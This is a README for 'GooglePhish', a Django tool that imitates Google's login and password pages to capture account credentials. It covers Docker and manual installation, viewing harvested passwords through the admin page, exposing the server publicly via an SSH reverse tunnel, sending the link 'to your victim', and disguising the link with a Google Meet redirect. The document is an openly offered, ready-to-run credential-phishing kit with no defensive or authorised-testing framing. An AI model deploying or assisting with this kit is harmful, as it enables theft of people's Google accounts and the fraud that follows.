# GooglePhish

![GooglePhish](.images/GooglePhish-500x500.png)

- Google Account Phishing Tool using Python Django Framework.

- Screenshots
  | Screenshots | Screenshots |
  | ----------- | ----------- |
  | ![Google Login Page Phisher Home Page Image](.images/home-page.png)| ![Google Login Page Phisher Password Page Image](.images/password-page.png) |

## Fast Installation Using docker

- Pull created image
  - Install [Docker](https://www.docker.com/products/docker-desktop/)
  - Pull googlephish image

      ```bash
      docker pull dmdhrumilmistry/googlephish
      ```

  - run docker image

      ```bash
      docker run -d -p 8000:8000 dmdhrumilmistry/googlephish
      ```

- Build Image and run using build command

    ```bash
    docker build -t googlephish .
    docker run -d -p 8000:8000 googlephish
    ```

- Using Docker Compose

    ```bash
    docker-compose up
    ```

## Installation

- Clone/Download repo

    ```bash
    git clone https://github.com/dmdhrumilmistry/GooglePhish.git
    ```

- Install requirements

    ```bash
    python3 -m pip install -r requirements.txt
    ```

- Check for errors

    ```bash
    python3 manage.py check
    ```

    > Proceed if no errors were encountered.

- migrate db

    ```bash
    python3 manage.py makemigrations
    python3 manage.py migrate
    ```

- Create user

    ```bash
    python3 manage.py createsuperuser
    ```

- Collect static files

    ```bash
    python3 manage.py collectstatic
    ```

- Run server

    ```bash
    python3 manage.py runserver
    ```

    > Use `--insecure` tag if any issue is encountered while loading static files.

## Generate and update new random key before using GooglePhish

- Generate and copy new key

    ```bash
    python3 generate_new_key.py
    ```

- update secret key in settings.py of GooglePhish on line 23

  ```python
    # SECURITY WARNING: keep the secret key used in production secret!
    SECRET_KEY = 'your_new_key'
  ```
  
## View Passwords using Admin Page

- admin login page

    ```
    http://127.0.0.1:8000/admin
    ```

## Start Server

```bash
python3 manage.py runserver
```

> if static files are not loading, turn on debug mode or use
>
> ```bash
> python3 manage.py runserver --insecure
> ```

## For phishing over the internet

- Start server

    ```bash
    python3 manage.py runserver
    ```

- forward port using ssh

    ```bash
    ssh -R 80:localhost:8000 localhost.run
    ```

    > 8000 is port of localhost server.
    > 80 is [localhost.run](https://localhost.run/) server port. Localhost is service that helps you to expose your server running on localhost to the internet, visit their [documentation](https://localhost.run/docs/) for more info

- Now send link to your victim

> You can redirect user from google meet to your phishing page link using
>
> ```
> https://meet.google.com/linkredirect?dest=your_link
> ```

## Project Maintainer
- [dmdhrumilmistry](https://github.com/dmdhrumilmistry)

## Contributors
 - [D4RKH0R1Z0N](https://github.com/D4RKH0R1Z0N)
   - Webpage Update 2022
   > Check `Php` Version at https://github.com/D4RKH0R1Z0N/gphish

### Have any Ideas 💡 or issue

- Create an issue
- Fork the repo, update script and create a Pull Request

## Connect with us
### dmdhrumilmistry

<p align ="center">
    <table>
      <tr>
        <td><a hrf = "https://github.com/dmdhrumilmistry" target="_blank"><img src = "https://img.shields.io/badge/Github-dmdhrumilmistry-333?style=for-the-badge"></a></td>
        <td><a href = "https://www.instagram.com/dmdhrumilmistry/" target="_blank"><img src = "https://img.shields.io/badge/Instagram-dmdhrumilmistry-833ab4?style=for-the-badge"></a></td>
        <td><a href = "https://twitter.com/dmdhrumilmistry" target="_blank"><img src = "https://img.shields.io/badge/Twitter-dmdhrumilmistry-4078c0?style=for-the-badge"></a></td>
      </tr>
      <tr>
        <td><a href = "https://www.youtube.com/channel/UChbjrRvbzgY3BIomUI55XDQ" target="_blank"><img src = "https://img.shields.io/badge/YouTube-Dhrumil%20Mistry-critical?style=for-the-badge"></a></td>
        <td><a href = "https://dhrumilmistrywrites.blogspot.com/ " target="_blank"><img src = "https://img.shields.io/badge/Blog-Dhrumil%20Mistry-bd2c00?style=for-the-badge"></a></td>
        <td><a href = "https://www.linkedin.com/in/dmdhrumilmistry/" target="_blank"><img src = "https://img.shields.io/badge/LinkedIn-Dhrumil%20Mistry-4078c0?style=for-the-badge"></a></td>
    </table>
</p>

### D4RKH0R1Z0N

<p align ="center">
    <table>
      <tr>
        <td><a hrf = "https://github.com/D4RKH0R1Z0N" target="_blank"><img src = "https://img.shields.io/badge/Github-D4RKH0R1Z0N-blue?style=for-the-badge"></a></td>
        <td><a href = "https://replit.com/@D4RKH0R1Z0N" target="_blank"><img src = "https://img.shields.io/badge/Repl.it-D4RKH0R1Z0N-%231c2333?style=for-the-badge"></a></td>
    </table>
</p>
